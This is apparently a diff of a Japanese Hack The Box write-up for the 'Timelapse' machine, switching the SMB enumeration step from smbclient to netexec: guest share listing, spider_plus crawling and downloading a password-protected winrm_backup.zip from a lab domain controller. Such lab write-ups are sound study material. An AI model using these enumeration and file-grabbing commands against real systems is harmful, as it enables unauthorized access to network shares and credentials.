@@ -25,38 +25,93 @@ Open 10.129.227.113:49693
 
 
 ## STEP 2
-匿名で共有フォルダ列挙  
-(netexecやsmbmapでは列挙できなかった、きちんんと`-N`を指定しないといけないツールでないと列挙できない感じ？)
+Guestで共有フォルダ列挙  
 ```sh
-└─$ smbclient -L '10.129.227.113' -N                        
-
-        Sharename       Type      Comment
-        ---------       ----      -------
-        ADMIN$          Disk      Remote Admin
-        C$              Disk      Default share
-        IPC$            IPC       Remote IPC
-        NETLOGON        Disk      Logon server share 
-        Shares          Disk      
-        SYSVOL          Disk      Logon server share 
-Reconnecting with SMB1 for workgroup listing.
-do_connect: Connection to 10.129.227.113 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
-Unable to connect with SMB1 -- no workgroup available
+└─$ netexec smb 10.129.227.113 -u ' ' -p '' --shares
+SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.227.113  445    DC01             [+] timelapse.htb\ : (Guest)
+SMB         10.129.227.113  445    DC01             [*] Enumerated shares
+SMB         10.129.227.113  445    DC01             Share           Permissions     Remark
+SMB         10.129.227.113  445    DC01             -----           -----------     ------
+SMB         10.129.227.113  445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.227.113  445    DC01             C$                              Default share
+SMB         10.129.227.113  445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.227.113  445    DC01             NETLOGON                        Logon server share 
+SMB         10.129.227.113  445    DC01             Shares          READ            
+SMB         10.129.227.113  445    DC01             SYSVOL                          Logon server share 
 ```
 sharesにアクセス、zipファイルをダウンロード
 ```sh
-└─$ smbclient -N //10.129.227.113/shares
-Try "help" to get a list of possible commands.
-smb: \>
+└─$ netexec smb 10.129.227.113 -u ' ' -p '' --share 'Shares' -M spider_plus
+SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.227.113  445    DC01             [+] timelapse.htb\ : (Guest)
+SPIDER_PLUS 10.129.227.113  445    DC01             [*] Started module spidering_plus with the following options:
+SPIDER_PLUS 10.129.227.113  445    DC01             [*]  DOWNLOAD_FLAG: False
+SPIDER_PLUS 10.129.227.113  445    DC01             [*]     STATS_FLAG: True
+SPIDER_PLUS 10.129.227.113  445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
+SPIDER_PLUS 10.129.227.113  445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
+SPIDER_PLUS 10.129.227.113  445    DC01             [*]  MAX_FILE_SIZE: 50 KB
+SPIDER_PLUS 10.129.227.113  445    DC01             [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
+SMB         10.129.227.113  445    DC01             [*] Enumerated shares
+SMB         10.129.227.113  445    DC01             Share           Permissions     Remark
+SMB         10.129.227.113  445    DC01             -----           -----------     ------
+SMB         10.129.227.113  445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.227.113  445    DC01             C$                              Default share
+SMB         10.129.227.113  445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.227.113  445    DC01             NETLOGON                        Logon server share 
+SMB         10.129.227.113  445    DC01             Shares          READ            
+SMB         10.129.227.113  445    DC01             SYSVOL                          Logon server share 
+SPIDER_PLUS 10.129.227.113  445    DC01             [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.227.113.json".
+SPIDER_PLUS 10.129.227.113  445    DC01             [*] SMB Shares:           6 (ADMIN$, C$, IPC$, NETLOGON, Shares, SYSVOL)
+SPIDER_PLUS 10.129.227.113  445    DC01             [*] SMB Readable Shares:  2 (IPC$, Shares)
+SPIDER_PLUS 10.129.227.113  445    DC01             [*] SMB Filtered Shares:  1
+SPIDER_PLUS 10.129.227.113  445    DC01             [*] Total folders found:  2
+SPIDER_PLUS 10.129.227.113  445    DC01             [*] Total files found:    5
+SPIDER_PLUS 10.129.227.113  445    DC01             [*] File size average:    378.77 KB
+SPIDER_PLUS 10.129.227.113  445    DC01             [*] File size min:        2.55 KB
+SPIDER_PLUS 10.129.227.113  445    DC01             [*] File size max:        1.07 MB
+                                                                                                                                                                       
+└─$ cat /home/kali/.nxc/modules/nxc_spider_plus/10.129.227.113.json
+{
+    "Shares": {
+        "Dev/winrm_backup.zip": {
+            "atime_epoch": "2022-03-04 03:00:38",
+            "ctime_epoch": "2021-10-25 11:48:14",
+            "mtime_epoch": "2021-10-25 17:05:30",
+            "size": "2.55 KB"
+        },
+        "HelpDesk/LAPS.x64.msi": {
+            "atime_epoch": "2021-10-25 11:48:42",
+            "ctime_epoch": "2021-10-25 11:48:42",
+            "mtime_epoch": "2021-10-25 11:55:14",
+            "size": "1.07 MB"
+        },
+        "HelpDesk/LAPS_Datasheet.docx": {
+            "atime_epoch": "2021-10-25 11:48:42",
+            "ctime_epoch": "2021-10-25 11:48:42",
+            "mtime_epoch": "2021-10-25 11:55:14",
+            "size": "101.97 KB"
+        },
+        "HelpDesk/LAPS_OperationsGuide.docx": {
+            "atime_epoch": "2021-10-25 11:48:42",
+            "ctime_epoch": "2021-10-25 11:48:42",
+            "mtime_epoch": "2021-10-25 11:55:14",
+            "size": "626.35 KB"
+        },
+        "HelpDesk/LAPS_TechnicalSpecification.docx": {
+            "atime_epoch": "2021-10-25 11:48:42",
+            "ctime_epoch": "2021-10-25 11:48:42",
+            "mtime_epoch": "2021-10-25 11:55:14",
+            "size": "70.98 KB"
+        }
+    }
+}  
 
-smb: \> ls Dev\
-  .                                   D        0  Mon Oct 25 15:40:06 2021
-  ..                                  D        0  Mon Oct 25 15:40:06 2021
-  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021
-
-                6367231 blocks of size 4096. 1328644 blocks available
-
-smb: \> get Dev\winrm_backup.zip 
-getting file \Dev\winrm_backup.zip of size 2611 as Dev\winrm_backup.zip (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)
+└─$ netexec smb 10.129.227.113 -u ' ' -p '' --share 'Shares' --get-file 'Dev/winrm_backup.zip' /home/kali/winrm_backup.zip
+SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.227.113  445    DC01             [+] timelapse.htb\ : (Guest)
+SMB         10.129.227.113  445    DC01             [*] Copying "Dev/winrm_backup.zip" to "/home/kali/winrm_backup.zip"
+SMB         10.129.227.113  445    DC01             [+] File "Dev/winrm_backup.zip" was downloaded to "/home/kali/winrm_backup.zip"
 ```
 zipにパスワードあり、クラック成功
 ```sh
